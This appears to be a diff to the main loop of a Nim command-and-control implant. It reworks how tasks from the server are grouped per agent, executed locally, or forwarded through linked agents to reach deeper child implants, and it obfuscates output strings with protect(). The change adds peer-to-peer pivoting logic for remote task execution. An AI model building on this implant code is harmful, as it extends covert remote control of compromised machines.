@@ -64,23 +64,43 @@ proc main() =
                 print protect("[*] No tasks to execute.") 
                 continue
 
-            let tasks: seq[seq[byte]] = ctx.deserializePacket(packet)
+            var tasks: Table[string, seq[seq[byte]]] = ctx.deserializePacket(packet)
             if tasks.len <= 0: 
                 print protect("[*] No tasks to execute.")
                 continue
+
+            echo tasks
 
             # Execute all retrieved tasks and return their output to the server
             var packer = Packer.init()
             var numResults: int = 0
 
-            for task in tasks: 
-                # Forward tasks to linked agents if necessary
-                if not ctx.forwardTask(task): 
-                    # Task belongs to the current agent -> execute it and send back the results
-                    var result: TaskResult = ctx.handleTask(ctx.deserializeTask(task))
-                    let resultBytes: seq[byte] = ctx.serializeTaskResult(result)
-                    inc numResults
-                    packer.addDataWithLengthPrefix(resultBytes)
+            # Collect tasks that are meant for the children of linked agents
+            # These tasks are forwarded to all linked agents until the eventually reach their destination
+            for agentId, agentTasks in tasks: 
+                if not ctx.links.hasKey(string.toUuid(agentId)) and agentId != ctx.agentId: 
+                    packer.add(string.toUuid(agentId))
+                    packer.add(cast[uint8](agentTasks.len()))
+                    for task in agentTasks:
+                        packer.addDataWithLengthPrefix(task)
+            let indirectChildTasks = packer.pack()
+            packer.reset()
+
+            # Handle task execution 
+            for agentId, agentTasks in tasks:
+
+                # Execute tasks belonging to the current agent 
+                if agentId == ctx.agentId:
+                    for task in agentTasks:
+                        var result: TaskResult = ctx.handleTask(ctx.deserializeTask(task))
+                        let resultBytes: seq[byte] = ctx.serializeTaskResult(result)
+                        inc numResults
+                        packer.addDataWithLengthPrefix(resultBytes)
+
+                # Forward remaining tasks to directly linked agents
+                elif ctx.links.hasKey(string.toUuid(agentId)):
+                    if ctx.forward(agentId, agentTasks, indirectChildTasks):
+                        print fmt"    [+] Forwarding tasks to agent {agentId}."  
 
             ctx.sendData(@[uint8(numResults)] & packer.pack())
 
